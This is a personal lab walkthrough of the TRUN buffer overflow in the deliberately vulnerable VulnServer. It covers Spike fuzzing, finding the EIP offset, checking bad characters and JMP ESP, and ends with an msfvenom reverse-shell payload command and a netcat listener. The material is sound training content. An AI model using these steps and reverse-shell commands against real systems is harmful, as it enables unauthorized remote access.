---
Author(s): M-Nelly
Source: Internal
Subject: Security
Topic: Binary Exploitation
Description: Old walkthrough of TRUN Buffer Overflow
Comments: Missing Screenshots
tags:
  - security
  - programming
  - compsci
---
## Overview:

TRUN is a beginner-friendly buffer overflow in VulnServer. These notes will serve as a walkthrough for the exploit and will also include explanations of each step.
## Narrative:
### Initialization - VulnServer & Immunity
#### VulnServer can be downloaded here: 
[https://github.com/stephenbradshaw/VulnServer](https://github.com/stephenbradshaw/VulnServer)
It is recommended that you run this in a VM with Defender disabled. 
#### I will be running it in a Windows 7 VM via TryHackMe here: [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)
VulnServer is run just like any other executable. You will get a window that displays a connection status, but otherwise doesn’t contain anything useful for exploitation. I recommend attaching Immunity debugger to the VulnServer process right after you run it.
#### You can get Immunity here: 
[https://www.immunityinc.com/products/debugger/index.html](https://www.immunityinc.com/products/debugger/index.html)
Launch Immunity and use Ctrl+F1 or File > Attach to open the attachment window. Click VulnServer and Attach.
>[!NOTE]
I like to change my font to make the text a little more readable.
>
That can be done in **Options > Appearance**. If you change the settings 
for a font other than Terminal 6 then you will have to change the font 
your windows are using as well. This can be done by right clicking 
anywhere in the main window, going to appearance, font(all), and 
selecting your preferred font. Eleven point Ludcida is my preference.

Once the process is attached in Immunity you will have to tell it to resume execution. You will see at the bottom right it says the process is paused. To run it you can click the play button in the ribbon or press F9. 
==***Don’t forget to do this each time you restart the application!***==
### Initial Connection & Fuzzing
We can now connect to our VulnServer using NetCat.
`nc $rh 9999`
The TRUN command takes input with the syntax `TRUN $string` and returns ‘TRUN COMPLETE’. If you notice, nothing in the debugger changed, nothing was added or removed from the registers and EIP remains the same. I would attribute this to VulnServer not processing our input although I’m not exactly sure what is going on behind the scenes. We would need to reverse engineer the function to get an answer and that is beyond the scope of what I will cover here.

At this point we need to start fuzzing to find a string that breaks out of the intended execution of this function. We can do this with pretty much any fuzzer, but I will showcase Spike here.
### Spike
#### Spike can be downloaded here: 
[https://github.com/SofianeHamlaoui/Spike-Fuzzer](https://github.com/SofianeHamlaoui/Spike-Fuzzer)
Spike is not called like a typical comand. Instead it comes packaged with several commands that seemingly have no correlation to spike itself. This is not ideal, but in this case we don’t have a choice. The spike function I will be using to fuzz trun is `generic_send_tcp`. This can be called from the terminal in Kali without needing to download or configure anything. If you run this command with no input it will give you information on how to use it:
```
Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR

Example:  ./generic_send_tcp 192.168.1.100 701 something.spk 0 0
```
We have the host and port, but don’t have a spike script. SKIPVAR and SKIPSTR are used to skip over previously completed sections of your fuzzing. SKIPVAR is used to skip to a specific variable in your script and SKIPSTR is used to skip to a specific line in Spike’s built in fuzz list.
#### Spike Scripting
Spike Function Reference:
```cpp
s_string("string");//prints your string as part of your fuzzing
s_string_repeat("string",x);//prints your string x number of times
s_string_variable("string");//the fuzzing happens here starting with your string
s_binary("x41"); //converts from hex and inserts binary
s_binary_repeat("x41,x");//converts from hex and repeats binary x times
// spike doesn't care how you format your hex!
// it will take 0x41, x41, and 41 to represent ASCII "A"
// it will also remove any whitespace

s_block_start("block1");//defines the start of "block1"
s_block_end("block1");//defines the end of "block1"
s_blocksize_string("block1",2);//sets the size of block1 to two characters
s_binary_block_size_byte("block1");//sets the size of block1 to one byte
s_read_packet();//prints data received from the network
s_readline();//reads a line of input

// C functions like printf() can also be used in addition to your spike commands
```
#### Our Spike Script
```cpp
s_readline(); //read welcome message
s_string("TRUN "); //start our command
s_string_variable("FUZZ"); //pass fuzz data into TRUN
```
#### Fuzzing With Spike
`generic_send_tcp $rh 9999 trun.spk 0 0`
If you watch Immunity you will see the overflow happens almost instantly. If all goes well, your output should look something like this:
![[Pasted image 20230116102651.png]]

The important bits to catch here are that EAX has our command ‘TRUN’, an extra bit of nonsense ‘/.:/’, and a ton of A’s. That bit of nonsense is our ticket in.

ESP has also been overrun with A’s and if you look at EIP it has been filled with 41414141 which is definitely not where it pointed before. A bit of digging will reveal that those 41’s are actually more A’s!

Here’s the fun part. Now that we have the overflow into EIP we can tell the application where to go next in memory and since we can overwrite arbitrarily beyond EIP we have a buffer we can point to and inject our shellcode.
### Finding EIP Offset
For this step we will need to know what size the buffer is that we are writing into. We need to do a bit of math to figure out roughly what size payload will crash our application. We will do this by comparing the memory addresses where we see our A’s.
Note that we won’t be able to see the input in our debugger until the buffer is fully overflowed and the program crashes. This means we will have to send our escape string too.
[Python Script](trun.py)

Next, we will need to generate a buffer to go in there with a pattern that doesn’t repeat. We will want to know how big our buffer is to generate a payload that is big enough, but not too big.

In our case our A’s start at roughly 01A0F206 and end at 01A0FDB4. Luckily for us, all you have to do in python to let it know you are dealing with hex is prepend 0x on your hex values.

Our buffer is 2994 characters, so we will generate our payload at 3000 to get a crash. We can do this with `msf-pattern_create -l 3000`. From there we just copy and paste that pattern into our python script and fire away.

From here you will have to copy the contents of EIP to `msf-pattern_offset -l 3000 -q $EIP`.

We have a match at offset 2003, so we know our EIP offset is 2003 hex values away from where our input starts. This means we need to put the memory address where we have stored our shell code 2003 characters into the input. This value will go in our offset variable.

We can do a PoC by inputting A’s until we hit our offset and then switching to B’s for the EIP register. You can see where I messed up my script trying to append another 1000 A’s in the screenshot below. That is completely unnecessary. The application crashes after EIP is overwritten since it doesn’t have an instruction pointer to tell it where to go next. I simply wanted to ensure a crash in case I got the offset completely wrong.

![[Pasted image 20230116102719.png]]

### Finding Bad Characters & JMP ESP

From this point we need to find out which characters our application can’t process. For this we have a python script called [badchars.py](http://badchars.py) that will print hex values from 0x01 to 0xFF. Copy this output into the buffer of [trun.py](http://trun.py) and run it.

Now we need to comb through the stack until we see our A’s turn to B’s. After that we should see some strange looking characters and 04 03 02 01 as the hex representation of the data in memory. If all is well, you will see the hex values increment by one from right to left down the stack. We are looking for characters that are out of place. The good news is that you can do a visual check from ! to ~ instead of reading the hex values.

Write down your bad characters!

Our next step is to find a JMP ESP pointer that we can exploit. What you are looking for is an ESP pointer that has all of the security features turned off. In our instance all of these will do.

Because we are working with x86 assembly, we need to take the address of our jmp esp function and put it into our function using ‘little endian’ format. This basically means we put the bytes in order from right to left. You might have noticed this when you were looking for bad characters.

![[Pasted image 20230116102759.png]]

### Generating A Payload & Getting A Shell

We will generate our payload using msfvenom.

`msfvenom -p windows/shell_reverse_tcp LHOST=$your_ip LPORT=$your_port EXITFUNC=thread -b "$bad_chars" -f py`

In our case the ony bad character is the null byte which is 00.

Copy and paste the output from your payload into [trun.py](http://trun.py), set up your netcat listener with`nc -lvnp 4444`, and run the script.

You should get a shell on the remote host.
## Other Actions Performed:
N/A
## Findings:
- [[Buffer Overflow]]
## Remediation:
- Input Validation
- Implement Memory-Safe Functions
## Footnotes:
### References:
[Spike](https://resources.infosecinstitute.com/topic/intro-to-fuzzing/)
[Beginner’s Guide To Buffer Overflows](https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/)
[Explains Some Memory Mapping Theory](https://stackoverflow.com/questions/34369379/buffer-overflow-exploit-why-does-jmp-esp-need-to-be-located-in-a-dll)
[Exploit Dev Tricks - Searching for commands](https://resources.infosecinstitute.com/topic/in-depth-seh-exploit-writing-tutorial-using-ollydbg/#commands)